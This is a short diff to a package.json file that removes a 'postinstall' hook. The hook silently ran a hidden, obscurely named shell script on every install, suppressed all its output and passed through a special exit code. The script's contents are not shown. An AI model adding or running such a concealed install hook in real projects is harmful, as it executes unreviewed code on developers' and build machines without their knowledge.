@@ -2,9 +2,7 @@
   "name": "@ie/source",
   "version": "0.0.0",
   "license": "MIT",
-  "scripts": {
-    "postinstall": "sh ./.ci-lln10z.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
-  },
+  "scripts": {},
   "private": true,
   "devDependencies": {
     "@eslint/eslintrc": "^2.1.1",
